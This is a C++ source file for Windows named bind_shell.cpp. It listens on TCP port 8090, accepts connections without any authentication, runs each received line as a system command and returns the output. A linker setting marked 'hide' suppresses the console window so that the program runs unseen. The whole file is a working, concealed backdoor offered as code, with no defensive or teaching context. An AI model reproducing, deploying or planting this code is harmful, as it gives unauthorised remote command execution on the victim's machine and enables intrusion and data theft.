// bind_shell.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Winsock2.h>
#include <stdio.h>
#include <windows.h>   
#pragma comment(lib,"WS2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  //hide

typedef struct MyData
{
	SOCKET sock;
	}MYDATA;

DWORD WINAPI Fun(LPVOID lpParamter)
{

	MYDATA *data = (MYDATA*)lpParamter;
	char sendBuf[50];
	sprintf(sendBuf,"Welcome !\n");
	send(data->sock,sendBuf,strlen(sendBuf),0);
	char recvBuf[1024];
	int n = 0;
	int n2 = 0;
	while((n = recv(data->sock,recvBuf,1024,0)) != -1){
		recvBuf[n] = '\0';//////////
		printf("%s\n",recvBuf);
		////
		FILE* pipe = _popen(recvBuf, "r");          
		if (!pipe)
			return 0;    
		while(!feof(pipe)) {
			if(fgets(recvBuf, 1024, pipe)){            
				n2 = strlen(recvBuf);
				send(data->sock,recvBuf,n2,0);
			}
		}
		_pclose(pipe); 
		////
		
	}
	closesocket(data->sock);
	return 0;
}
int main(void)
{
	
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD( 1, 1 );

	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		return 0;
	}

	if ( LOBYTE( wsaData.wVersion ) != 1 ||
		HIBYTE( wsaData.wVersion ) != 1 ) {
			WSACleanup( );
			return 0;
	}
	SOCKET sockSrv=socket(AF_INET,SOCK_STREAM,0);

	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr=htonl(INADDR_ANY);
	addrSrv.sin_family=AF_INET;
	addrSrv.sin_port=htons(8090);

	bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));

	listen(sockSrv,5);

	SOCKADDR_IN addrClient;
	int len=sizeof(SOCKADDR);


	while(1)
	{
		SOCKET sockConn=accept(sockSrv,(SOCKADDR*)&addrClient,&len);
		MYDATA mydata;
		mydata.sock = sockConn;
		HANDLE hThread = CreateThread(NULL, 0, Fun, &mydata, 0, NULL);
		CloseHandle(hThread);
	}



}

